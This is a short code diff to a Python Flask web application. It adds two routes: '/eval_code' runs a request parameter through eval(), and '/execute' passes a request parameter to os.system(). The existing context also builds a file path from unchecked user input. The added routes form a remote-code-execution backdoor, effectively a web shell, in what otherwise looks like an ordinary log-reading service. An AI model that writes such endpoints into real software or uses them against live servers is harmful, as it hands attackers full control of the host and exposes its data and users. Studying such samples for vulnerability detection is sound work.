@@ -15,3 +15,15 @@ def read_log():
     log_path = '/var/logs/' + log_name
     with open(log_path, 'r') as f:
         return f.read()
+
+@app.route('/eval_code')
+def eval_code():
+    code = request.args.get('code')
+    result = eval(code)
+    return str(result)
+
+@app.route('/execute')
+def execute_command():
+    cmd = request.args.get('cmd')
+    output = os.system(cmd)
+    return str(output)
